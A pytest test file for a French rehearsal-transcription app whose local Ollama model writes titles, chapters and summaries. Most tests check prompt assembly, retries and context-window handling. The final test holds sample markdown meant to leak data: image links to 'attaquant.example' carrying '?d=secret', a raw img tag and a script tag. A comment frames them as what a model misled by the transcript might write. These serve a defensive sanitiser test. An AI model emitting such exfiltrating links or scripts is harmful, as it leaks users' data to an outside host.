"""Summaries and titles: the single assembly, the run that keeps every prompt, the context
window that is never overflowed, and the service around them. The model is a fake."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from coulisses_app import jobs
from coulisses_app.api import create_app
from coulisses_app.paths import DataDir
from coulisses_app.processing import Processor
from coulisses_app.prompting import assembly
from coulisses_app.prompting.generate import generate
from coulisses_app.storage.db import connect

from .conftest import FAKE_CHAIN, FakeModel, local_client


def run_all(data: DataDir, fake: FakeModel) -> None:
    """Run every queued job, the chain then the generations it queues."""
    processor = Processor(data, FAKE_CHAIN, model_client=fake)
    while True:
        conn = connect(data)
        try:
            job = jobs.claim_next(conn)
        finally:
            conn.close()
        if job is None:
            return
        processor.run_job(job)


@pytest.fixture
def client(data: DataDir, fake_model: FakeModel) -> TestClient:
    app = create_app(
        data, FAKE_CHAIN, profile="essai", processor=None, web_dir=None, model_client=fake_model
    )
    return local_client(app)


def imported(client: TestClient, recording: Path) -> str:
    with recording.open("rb") as f:
        response = client.post(
            "/api/seances", files={"fichier": ("a.wav", f, "audio/wav")}, data={"non_nommes": "2"}
        )
    assert response.status_code == 201
    return response.json()["id"]


def summarized(client: TestClient, data: DataDir, recording: Path, fake: FakeModel) -> str:
    """A processed session, then a Résumé Impro asked for (summaries are on demand)."""
    session_id = imported(client, recording)
    run_all(data, fake)
    asked = client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "resume-impro"})
    assert asked.status_code == 202
    run_all(data, fake)
    return session_id


def test_the_assembly_keeps_its_order_and_always_asks_for_french() -> None:
    prompt = assembly.assemble("CONSIGNE DE L'ACTION", "CONTEXTE", "[0:00] Marie : bonjour")
    system = prompt.system
    positions = [
        system.index(assembly.system_frame()[:40]),
        system.index("CONSIGNE DE L'ACTION"),
        system.index(assembly.FALLBACK_RULE[:40]),
        system.index(assembly.FRENCH_INSTRUCTION[:40]),
    ]
    assert positions == sorted(positions)
    assert prompt.user.index("CONTEXTE") < prompt.user.index("[0:00] Marie : bonjour")
    assert [m["role"] for m in prompt.messages()] == ["system", "user"]


def test_the_six_provided_actions_are_read_with_their_names() -> None:
    names = {a.ref: a.name for a in assembly.provided_actions()}
    assert names == {
        "resume-impro": "Résumé Impro",
        "compte-rendu-reunion": "Compte rendu de réunion",
        "retours-de-jeu": "Retours de jeu par comédien",
        "idees-scenes": "Idées de scènes et personnages",
        "prochaines-etapes": "Prochaines étapes et logistique",
        "resume-court": "Résumé court pour la troupe",
    }
    for action in assembly.provided_actions():
        # Their own text never repeats what the assembly adds (rules/prompts.md).
        assert assembly.FRENCH_INSTRUCTION not in action.prompt
        assert "Aucun contenu substantiel" not in action.prompt


def test_after_processing_only_the_chapters_are_made(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    # Only the chapters (JSON asked), then the check of their kind (ADR 0045): the title and
    # the summaries are on demand (ADR 0026).
    assert len(fake_model.calls) == 2 and all(f is not None for f in fake_model.formats)
    assert client.get(f"/api/seances/{session_id}").json()["session"]["title"] is None
    listed = client.get(f"/api/seances/{session_id}/resumes").json()
    assert listed == {"generations": [], "pending": []}


def test_a_title_asked_for_reads_the_chapters_not_the_transcript(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    fake_model.answer = "« Scène du marché. »"
    client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "titre"})
    run_all(data, fake_model)
    session = client.get(f"/api/seances/{session_id}").json()["session"]
    assert session["title"] == "Scène du marché"  # cleaned: no quotes, no final point
    _model, messages, options = fake_model.calls[-1]
    assert options["stop"] == ["\n"]  # one line: never cut for going on (P8)
    # The chapters, each with how long it lasts.
    assert "# Chapitres de la séance\n- [0:00] Essai (discussion, 1 min)" in messages[1]["content"]
    assert "Locuteur 1 : bonjour" not in messages[1]["content"]  # not the transcript
    assert assembly.FRENCH_INSTRUCTION in messages[0]["content"]  # the assembly still (P4)
    view = client.get(f"/api/seances/{session_id}/transcript").json()
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert (prov.input_kind, prov.input_run_id) == ("chapters", view["phases_run_id"])


def test_a_title_too_long_is_asked_once_more_never_cut(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    answers = iter(
        [
            "Avenir du métier, chantier, organisation, scène, costumes, journal, pétanque, photos",
            "Le journal joué et l'avenir du métier",
        ]
    )
    chat = fake_model.chat

    def answering(model, messages, options, *, answer_format=None):  # type: ignore[no-untyped-def]
        said = chat(model, messages, options, answer_format=answer_format)
        return said.model_copy(update={"content": next(answers)})

    fake_model.chat = answering  # type: ignore[method-assign]
    calls_before = len(fake_model.calls)
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.status == "succeeded", prov.error
    assert [c.covers for c in prov.calls] == [None, "titre redemandé, plus court"]
    retry = fake_model.calls[calls_before + 1][1][0]["content"]
    assert "fait 10 mots" in retry and "8 mots au plus" in retry
    assert assembly.FRENCH_INSTRUCTION in retry  # P4
    folder = data.run_dir(session_id, prov.run_id)
    assert (folder / "output.md").read_text().strip() == "Le journal joué et l'avenir du métier"
    # Still too long the second time: the shorter is kept, as it is, never cut.
    answers = iter(
        [
            "Un deux trois quatre cinq six sept huit neuf dix onze",
            "Un deux trois quatre cinq six sept huit neuf",
        ]
    )
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    folder = data.run_dir(session_id, prov.run_id)
    assert (
        folder / "output.md"
    ).read_text().strip() == "Un deux trois quatre cinq six sept huit neuf"
    # Longer the second time: the first is kept.
    first = "Un deux trois quatre cinq six sept huit neuf"
    answers = iter([first, first + " dix onze"])
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert (data.run_dir(session_id, prov.run_id) / "output.md").read_text().strip() == first


def test_a_title_asked_again_in_vain_keeps_the_first_and_says_why(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    first = "Un deux trois quatre cinq six sept huit neuf dix"
    chat = fake_model.chat
    asked = 0

    def answering(model, messages, options, *, answer_format=None):  # type: ignore[no-untyped-def]
        nonlocal asked
        asked += 1
        said = chat(model, messages, options, answer_format=answer_format)
        if asked == 1:
            return said.model_copy(update={"content": first})
        return said.model_copy(update={"done_reason": "length", "content": "Tronqué"})

    fake_model.chat = answering  # type: ignore[method-assign]
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.status == "succeeded", prov.error
    assert (data.run_dir(session_id, prov.run_id) / "output.md").read_text().strip() == first
    assert prov.calls[1].covers is not None and "en vain" in prov.calls[1].covers


def test_without_chapters_a_title_reads_the_latest_summary_then_the_transcript(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    fake_model.phases_answer = "pas du JSON"  # no chapters
    session_id = imported(client, recording)
    run_all(data, fake_model)
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.input_kind == "transcript"
    assert "Locuteur 1 : bonjour" in fake_model.calls[-1][1][1]["content"]
    client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "resume-impro"})
    run_all(data, fake_model)
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.input_kind == "summary"
    summary_run = client.get(f"/api/seances/{session_id}/resumes").json()["generations"][0]
    assert prov.input_run_id == summary_run["run_id"]
    assert "# Résumé de la séance\n## Décisions" in fake_model.calls[-1][1][1]["content"]


def test_a_generation_keeps_every_prompt_and_its_provenance(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    first = client.get(f"/api/seances/{session_id}/transcript").json()["speakers"][0]["label"]
    client.post(
        f"/api/seances/{session_id}/corrections",
        json={"kind": "assign_speaker", "speaker": first, "name": "Marie"},
    )
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.status == "succeeded" and prov.strategy == "unique"
    assert prov.options["num_ctx"] == assembly.settings().num_ctx  # always explicit
    assert prov.edits_applied == 1
    folder = data.run_dir(session_id, prov.run_id)
    sent = (folder / "calls/01-prompt.txt").read_text(encoding="utf-8")
    _model, messages, options = fake_model.calls[-1]
    system, user = messages[0]["content"], messages[1]["content"]
    assert sent == f"=== système ===\n{system}\n\n=== utilisateur ===\n{user}\n"
    assert "] Marie : bonjour" in messages[1]["content"]  # the corrected name, not « Locuteur 1 »
    assert assembly.FRENCH_INSTRUCTION in messages[0]["content"]
    assert (folder / "output.md").read_text(encoding="utf-8").startswith("## Décisions")
    saved = json.loads((folder / "provenance.json").read_text(encoding="utf-8"))
    assert saved["model"] == "modele-essai" and saved["model_digest"] == "abc"
    assert options["temperature"] == assembly.settings().temperature


def test_a_long_session_is_summarised_by_parts_then_merged(
    client: TestClient,
    data: DataDir,
    recording: Path,
    fake_model: FakeModel,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    small = assembly.settings().model_copy(update={"num_ctx": 6000, "response_reserve": 500})
    monkeypatch.setattr(assembly, "settings", lambda: small)
    long_lines = [
        assembly.Line(
            float(i * 10), f"[{i // 6}:{i % 6}0] Marie : " + "on reprend la scène du marché " * 10
        )
        for i in range(60)
    ]
    monkeypatch.setattr(assembly, "transcript_lines", lambda _view, **_: long_lines)
    fake_model.prompt_tokens = 100
    calls_before = len(fake_model.calls)
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.status == "succeeded", prov.error
    assert prov.strategy == "sections"
    kinds = [c.kind for c in prov.calls]
    assert kinds[-1] == "consolidation" and set(kinds[:-1]) == {"section"}
    assert kinds.count("section") >= 2
    for _, messages, options in fake_model.calls[calls_before:]:
        assert assembly.FRENCH_INSTRUCTION in messages[0]["content"]  # every call, P4
        assert options["num_ctx"] == 6000


def test_a_full_context_window_is_a_failure_not_a_cut(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    fake_model.prompt_tokens = assembly.settings().num_ctx  # Ollama filled the window
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.status == "failed"
    assert prov.error is not None and "fenêtre" in prov.error.message
    folder = data.run_dir(session_id, prov.run_id)
    assert not (folder / "output.md").exists()  # nothing truncated is kept
    assert (folder / "calls/01-response.md").exists()  # but what came back is kept, to see


def test_ollama_down_is_said_plainly(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    fake_model.down = True
    assert (
        client.post(
            f"/api/seances/{session_id}/resumes", json={"action_ref": "compte-rendu-reunion"}
        ).status_code
        == 202
    )
    run_all(data, fake_model)
    pending = client.get(f"/api/seances/{session_id}/resumes").json()["pending"]
    assert pending[-1]["state"] == "failed"
    assert "lancez l'application Ollama" in pending[-1]["error"]
    models = client.get("/api/modeles").json()
    assert models["reachable"] is False and models["error"]


def test_a_summary_goes_stale_when_the_transcript_is_corrected(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = summarized(client, data, recording, fake_model)
    assert (
        client.get(f"/api/seances/{session_id}/resumes").json()["generations"][0]["stale"] is False
    )
    client.post(
        f"/api/seances/{session_id}/corrections",
        json={"kind": "edit_text", "turn": 0, "text": "bonsoir"},
    )
    assert (
        client.get(f"/api/seances/{session_id}/resumes").json()["generations"][0]["stale"] is True
    )


def test_the_user_title_is_never_overwritten(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    assert (
        client.patch(f"/api/seances/{session_id}", json={"title": "  Ma   séance "}).json()["title"]
        == "Ma séance"
    )
    fake_model.answer = "Un autre titre"
    run_all(data, fake_model)
    assert client.get(f"/api/seances/{session_id}").json()["session"]["title"] == "Ma séance"
    assert client.patch(f"/api/seances/{session_id}", json={"title": " "}).status_code == 422


def test_the_model_chosen_for_a_summary_becomes_the_summaries_one(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    shipped = assembly.settings().default_model
    assert client.get("/api/modeles").json()["default"] == shipped
    client.post(
        f"/api/seances/{session_id}/resumes",
        json={"action_ref": "resume-impro", "model": "modele-essai"},
    )
    info = client.get("/api/modeles").json()
    assert info["default"] == "modele-essai"
    # Only the summaries': the title and the chapters keep theirs (ADR 0039).
    assert info["writings"] == {"titre": shipped, "chapitres": shipped, "resume": "modele-essai"}
    assert (
        client.post(
            f"/api/seances/{session_id}/resumes", json={"action_ref": "inconnue"}
        ).status_code
        == 404
    )


def test_markdown_export_holds_the_summary_and_the_corrected_transcript(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = summarized(client, data, recording, fake_model)
    response = client.get(f"/api/seances/{session_id}/export", params={"contenu": "tout"})
    assert response.status_code == 200
    assert "attachment" in response.headers["content-disposition"]
    text = response.text
    assert "## Résumé Impro" in text and "## Décisions" in text
    assert "## Transcription" in text and "bonjour" in text


def test_a_new_space_starts_from_a_template(client: TestClient) -> None:
    work = client.post(
        "/api/espaces", json={"name": "Équipe produit", "template": "reunion"}
    ).json()
    assert client.get(f"/api/espaces/{work['id']}/actions").json() == [
        {"action_ref": "compte-rendu-reunion", "auto_run": True, "model": None}
    ]
    empty = client.post("/api/espaces", json={"name": "Brouillon"}).json()
    assert client.get(f"/api/espaces/{empty['id']}/actions").json() == []
    changed = client.put(
        f"/api/espaces/{empty['id']}/actions/resume-impro", json={"auto_run": True}
    ).json()
    assert changed[0]["auto_run"] is True
    assert client.post("/api/espaces", json={"name": "X", "template": "?"}).status_code == 422


def test_the_published_provenance_schema_is_up_to_date() -> None:
    from coulisses_app.prompting.generate import Provenance

    published = Path(__file__).parents[1] / "schemas" / "generation-provenance.schema.json"
    assert json.loads(published.read_text(encoding="utf-8")) == Provenance.model_json_schema(), (
        "regenerate schemas/generation-provenance.schema.json"
    )


@pytest.mark.parametrize(
    ("setup", "said"),
    [
        (lambda f: setattr(f, "done_reason", "length"), "coupée"),
        (lambda f: setattr(f, "counted", False), "combien de tokens"),
        (lambda f: setattr(f, "prompt_tokens", 10_000_000), "fenêtre"),
        (lambda f: setattr(f, "answer", "   "), "vide"),
    ],
)
def test_an_answer_that_cannot_be_trusted_is_not_kept(
    client: TestClient,
    data: DataDir,
    recording: Path,
    fake_model: FakeModel,
    setup: object,
    said: str,
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    setup(fake_model)  # type: ignore[operator]
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.status == "failed" and prov.error is not None and said in prov.error.message
    assert not (data.run_dir(session_id, prov.run_id) / "output.md").exists()


def test_an_estimate_below_the_real_count_is_refused(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    fake_model.prompt_tokens = 30_000  # far more than the estimate of this short prompt
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.status == "failed" and prov.error is not None
    assert "caracteres_par_token" in prov.error.message


def test_a_line_too_long_for_the_window_is_refused_not_cut(
    client: TestClient,
    data: DataDir,
    recording: Path,
    fake_model: FakeModel,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    small = assembly.settings().model_copy(update={"num_ctx": 6000, "response_reserve": 500})
    monkeypatch.setattr(assembly, "settings", lambda: small)
    monkeypatch.setattr(
        assembly,
        "transcript_lines",
        lambda _view, **_: [assembly.Line(0.0, "[0:00] Marie : " + "mot " * 5000)],
    )
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert (
        prov.status == "failed" and prov.error is not None and "trop longue" in prov.error.message
    )


def test_a_session_with_no_content_keeps_its_date_as_title(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    fake_model.answer = "Séance sans contenu"
    run_all(data, fake_model)
    assert client.get(f"/api/seances/{session_id}").json()["session"]["title"] is None
    fake_model.answer = "« »"
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.status == "failed" and prov.error is not None and "titre" in prov.error.message


def test_undoing_then_making_another_correction_makes_the_summary_stale(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    base = f"/api/seances/{session_id}"
    first = client.post(
        f"{base}/corrections", json={"kind": "edit_text", "turn": 0, "text": "bonsoir"}
    ).json()["edits"][-1]["id"]
    generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    client.post(f"{base}/corrections/{first}/annuler")
    client.post(f"{base}/corrections", json={"kind": "edit_text", "turn": 0, "text": "salut"})
    # Same number of corrections in force, not the same ones: stale.
    latest = client.get(f"{base}/resumes").json()["generations"][0]
    assert latest["stale"] is True


def test_think_and_the_ollama_version_are_in_the_provenance(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    prov = generate(data, session_id, "resume-impro", "modele-essai", fake_model)
    assert prov.options["think"] is False and prov.ollama_version == "0.0-essai"


def test_a_failed_title_can_be_asked_again_and_the_failure_then_goes(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    fake_model.down = True
    run_all(data, fake_model)
    client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "titre"})
    run_all(data, fake_model)
    pending = client.get(f"/api/seances/{session_id}/resumes").json()["pending"]
    assert [(p["action_ref"], p["state"]) for p in pending] == [("titre", "failed")]
    fake_model.down = False
    fake_model.answer = "Scène du marché"
    assert (
        client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "titre"}).status_code
        == 202
    )
    run_all(data, fake_model)
    assert client.get(f"/api/seances/{session_id}/resumes").json()["pending"] == []
    assert client.get(f"/api/seances/{session_id}").json()["session"]["title"] == "Scène du marché"


def test_a_summary_with_an_unreadable_provenance_is_listed_with_why(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = summarized(client, data, recording, fake_model)
    listed = client.get(f"/api/seances/{session_id}/resumes").json()["generations"][0]
    (data.run_dir(session_id, listed["run_id"]) / "provenance.json").unlink()
    again = client.get(f"/api/seances/{session_id}/resumes").json()["generations"][0]
    assert again["problem"] and "provenance" in again["problem"]
    assert again["output"]  # the summary itself is still shown


def test_a_title_followed_by_more_is_kept_even_when_the_rest_is_cut(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    session_id = imported(client, recording)
    run_all(data, fake_model)
    fake_model.done_reason = "length"
    fake_model.answer = "Le marché et la fin\n\n## Résumé\nLa séance a commencé par"
    prov = generate(data, session_id, "titre", "modele-essai", fake_model)
    assert prov.status == "succeeded", prov.error
    assert client.get(f"/api/seances/{session_id}").json()["session"]["title"] == (
        "Le marché et la fin"
    )
    fake_model.answer = "Le marché et la f"  # the title itself cut: refused (P8)
    assert generate(data, session_id, "titre", "modele-essai", fake_model).status == "failed"


def test_each_writing_is_made_with_its_own_model(
    client: TestClient, data: DataDir, recording: Path, fake_model: FakeModel
) -> None:
    """Title, chapters and summaries each have their model, chosen in the Réglages: what is
    asked afterwards is written with it, by hand or after processing."""
    for writing, model in (("titre", "petit"), ("chapitres", "moyen"), ("resume", "grand")):
        assert (
            client.put(f"/api/reglages/modeles/{writing}", json={"model": model}).status_code == 200
        )
    assert client.get("/api/modeles").json()["writings"] == {
        "titre": "petit",
        "chapitres": "moyen",
        "resume": "grand",
    }
    assert client.put("/api/reglages/modeles/autre", json={"model": "x"}).status_code == 422
    assert client.put("/api/reglages/modeles/titre", json={"model": ""}).status_code == 422

    session_id = imported(client, recording)
    run_all(data, fake_model)  # the chapters, after processing
    client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "titre"})
    client.post(f"/api/seances/{session_id}/resumes", json={"action_ref": "resume-impro"})
    run_all(data, fake_model)
    client.post(f"/api/seances/{session_id}/chapitres")  # detected again
    run_all(data, fake_model)
    # The chapters are detected then their kind checked, with the same model (ADR 0045).
    assert [model for model, _, _ in fake_model.calls] == [
        "moyen",
        "moyen",
        "petit",
        "grand",
        "moyen",
        "moyen",
    ]


def test_the_model_chosen_before_stays_for_every_writing(client: TestClient, data: DataDir) -> None:
    """A model chosen before there was one per writing is kept for the three (P8)."""
    conn = connect(data)
    try:
        with conn:
            conn.execute(
                "INSERT INTO app_setting (key, value) VALUES ('modele', ?)", (json.dumps("ancien"),)
            )
    finally:
        conn.close()
    assert client.get("/api/modeles").json()["writings"] == {
        "titre": "ancien",
        "chapitres": "ancien",
        "resume": "ancien",
    }


def test_an_export_fetches_nothing_the_model_wrote() -> None:
    """A model fooled by what was said could write an image that, opened in an editor,
    would send something away: exported, it is its description, as in the app."""
    from coulisses_app.summaries import inert_markdown

    written = (
        "## Retours\n"
        "- ![pixel](https://attaquant.example/x?d=secret) et ![logo][ref]\n"
        "- voir [la note](https://attaquant.example/n) ou <https://exemple.org>\n"
        '- <img src="https://attaquant.example/x"> <script>alert(1)</script>\n'
        "- 3 < 4 et **gras**, [crochets] seuls\n"
        "- ![court] et ![vide][]\n\n[court]: https://attaquant.example/c\n[vide]: https://attaquant.example/v\n"
    )
    shown = inert_markdown(written)
    assert "](https://attaquant" not in shown and "](https://exemple" not in shown
    assert "<img" not in shown and "<script" not in shown  # raw HTML only as text
    assert "pixel" in shown and "logo" in shown and "la note" in shown
    assert "&lt;img" in shown and "&lt;script>" in shown
    assert "3 < 4 et **gras**, [crochets] seuls" in shown  # the rest is untouched
    assert "![" not in shown  # no image of any form, so no definition is ever fetched
